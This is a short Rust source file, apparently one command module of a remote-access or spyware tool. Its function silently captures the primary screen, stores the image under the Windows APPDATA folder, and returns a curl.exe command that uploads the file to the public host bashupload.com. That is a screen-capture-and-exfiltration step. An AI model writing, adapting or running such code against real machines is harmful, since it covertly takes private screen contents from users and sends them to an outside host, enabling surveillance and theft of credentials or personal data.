use screenshots::Screen;
use std::time::{SystemTime, UNIX_EPOCH};
use std::env;


pub fn take_screenshot() -> String {
    let screens_result = Screen::all();
    let screens = match screens_result {
        Ok(s) => s,
        Err(e) => {
            return format!("Failed to get screens: {}", e);
        }
    };
    if let Some(screen) = screens.first() {
        let image = match screen.capture() {
            Ok(img) => img,
            Err(e) => {
                return format!("Failed to capture screen: {}", e);
            }
        };

        let timestamp = match SystemTime::now().duration_since(UNIX_EPOCH) {
            Ok(dur) => dur.as_millis(),
            Err(e) => {
                return format!("Failed to get timestamp: {}", e);
            }
        };

        let appdata = match env::var("APPDATA") {
            Ok(path) => path,
            Err(e) => {
                return format!("Failed to get APPDATA: {}", e);
            }
        };
        let file_path = std::path::PathBuf::from(appdata)
            .join(format!("{}.png", timestamp));

        match image.save(&file_path) {
            Ok(_) => {
                let mut url = format!("Save in {}", file_path.display().to_string());
                url.push_str(&format!("\nUse curl.exe -F \"file=@{}\" https://bashupload.com/", file_path.display()));
                return url;
            }
            Err(e) => {
                return format!("Failed to save screenshot: {}", e);
            }
        }
    } else {
        return "No screen found".into();
    }
}